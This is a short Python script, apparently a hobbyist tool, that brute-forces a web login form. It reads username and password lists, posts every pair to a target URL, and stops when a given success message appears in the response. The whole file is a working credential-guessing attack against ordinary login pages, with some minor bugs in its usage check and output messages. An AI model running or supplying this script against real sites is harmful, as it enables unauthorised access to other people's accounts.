#!/bin/python3
# import nl,pr,ty,pb from '/basic.py'

from pwn import *
import sys
import requests

def nl():
    print('\t')


def pr(a):
    print(a)

if len(sys.argv) != 5:
    pr('command should be : {} <http://target.com> <usernames.txt> <passwords.txt> <welcome message of successful login.>'.format(
        sys.argv[1]))

target = sys.argv[1]
usernames = sys.argv[2]
passwords = sys.argv[3]
# id=sys.argv[4]
# pass=sys.argv[5]
needle = sys.argv[4]
with open(usernames) as username_list:
    for username in username_list:
        with open(passwords, 'r') as password_list:
            for password in password_list:
                password = password.strip('\n').encode()
                sys.stdout.write(
                    '[x] Attempting user:password -> {}:{} \r'.format(username, password.decode()))
                sys.stdout.flush()
                r = requests.post(
                    target, data={'user': username, 'pass': password})
                if needle.encode() in r.content:
                    sys.stdout.write('\n')
                    sys.stdout.write('\t [>>>] Valid password "{}" found for user "{}"!'.format(
                        password.decode(), username))
                    sys.exit()
                sys.stdout.flush()
                sys.stdout.write('\n')
                sys.stdout.write('\t No password found for user "{}"'.format(username))
                sys.stdout.write('\n')